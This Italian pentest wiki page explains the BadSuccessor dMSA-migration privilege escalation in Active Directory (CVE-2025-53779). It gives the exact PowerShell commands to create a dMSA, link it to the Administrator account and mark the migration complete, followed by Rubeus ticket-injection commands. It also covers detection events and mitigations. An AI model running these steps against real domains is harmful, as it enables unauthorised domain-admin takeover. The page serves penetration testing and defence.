# BadSuccessor: escalation dei privilegi tramite abuso della migrazione dMSA delegata

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

Gli account di servizio gestiti delegati (**dMSA**) sono i successori di nuova generazione degli **gMSA**, introdotti in Windows Server 2025. Un flusso di migrazione legittimo consente agli amministratori di sostituire un account *obsoleto* (utente, computer o account di servizio) con un dMSA, preservandone in modo trasparente le autorizzazioni. Il flusso è esposto tramite cmdlet PowerShell come `Start-ADServiceAccountMigration` e `Complete-ADServiceAccountMigration` e si basa su due attributi LDAP dell'**oggetto dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *link DN* all'account sostituito (obsoleto).
* **`msDS-DelegatedMSAState`**       – stato della migrazione (`0` = nessuna, `1` = in corso, `2` = *completata*).<sup>[[1]](#references)</sup>

Se un attaccante può creare **qualsiasi** dMSA all'interno di una OU e manipolare direttamente questi 2 attributi, LSASS e il KDC considereranno il dMSA un *successore* dell'account collegato. Quando poi l'attaccante si autentica come dMSA, **eredita tutti i privilegi dell'account collegato** – fino a quelli di **Domain Admin** se viene collegato l'account Administrator.<sup>[[1]](#references)</sup>

Questa tecnica è stata denominata **BadSuccessor** da Unit 42 nel 2025. Microsoft le ha successivamente assegnato il codice **CVE-2025-53779** e ha rilasciato un aggiornamento di sicurezza nell'**agosto 2025**. La tecnica rimane rilevante per gli ambienti Windows Server 2025 non aggiornati e per le verifiche delle deleghe pericolose sulle OU.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

Sui DC aggiornati, una [migrazione dMSA a due vie](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch) può comunque esporre un account target se l'attaccante può anche scriverne gli attributi di migrazione. Questo scenario è più limitato rispetto all'attacco originale, che consentiva di scegliere un target arbitrario.

### Prerequisiti dell'attacco

1. Un account *autorizzato* a creare oggetti all'interno di **un'Unità organizzativa (OU)** *e* con almeno uno dei seguenti permessi:
   * `Create Child` → classe oggetto **`msDS-DelegatedManagedServiceAccount`**
   * `Create Child` → **`All Objects`** (creazione generica)
2. Connettività di rete a LDAP e Kerberos (scenario standard con computer aggiunto al dominio / attacco remoto).<sup>[[1]](#references)</sup>

## Enumerazione delle OU vulnerabili

Unit 42 ha rilasciato uno script helper PowerShell che analizza i descrittori di sicurezza di ogni OU e mette in evidenza gli ACE richiesti:<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

Sotto il cofano, lo script esegue una ricerca LDAP paginata per `(objectClass=organizationalUnit)` e controlla ogni `nTSecurityDescriptor` alla ricerca di

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `ID schema di Active Directory: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (classe di oggetti *msDS-DelegatedManagedServiceAccount*)

## Passaggi di sfruttamento

Una volta identificata un'OU scrivibile, bastano solo 3 scritture LDAP per sferrare l'attacco:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Dopo la replica, l'attaccante può semplicemente eseguire il **logon** come `attacker_dMSA$` o richiedere un Kerberos TGT: Windows creerà il token dell'account *sostituito*.<sup>[[1]](#references)</sup>

### Automazione

Diversi PoC pubblici automatizzano l'intero flusso di lavoro, incluso il recupero della password e la gestione dei ticket:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* Modulo NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Rilevamento e threat hunting

Abilita **Object Auditing** sulle OU e monitora i seguenti eventi di sicurezza di Windows:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Creazione dell'oggetto **dMSA**
* **5136** – Modifica di **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Modifiche di attributi specifici
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Emissione di TGT per la dMSA

La correlazione tra `4662` (modifica di attributi), `4741` (creazione di un account computer/servizio) e `4624` (accesso successivo) permette di individuare rapidamente l'attività BadSuccessor. Le soluzioni XDR come **XSIAM** includono query pronte all'uso (vedi i riferimenti).<sup>[[2]](#references)</sup>

## Mitigazione

* Applica l'aggiornamento di sicurezza Microsoft per **CVE-2025-53779** e verifica il livello di patch di ogni controller di dominio Windows Server 2025.<sup>[[6]](#references)</sup>
* Applica il principio del **privilegio minimo**: delega la gestione degli *account di servizio* solo a ruoli fidati.
* Rimuovi `Create Child` / `msDS-DelegatedManagedServiceAccount` dalle OU che non ne hanno esplicitamente bisogno.
* Monitora gli ID evento elencati sopra e genera avvisi quando identità *non-Tier-0* creano o modificano dMSA.

## Vedi anche


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: abuso di dMSA per aumentare i privilegi in Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Quando gli account buoni diventano cattivi: sfruttamento degli account di servizio gestiti delegati](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Centro di risposta di sicurezza Microsoft – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
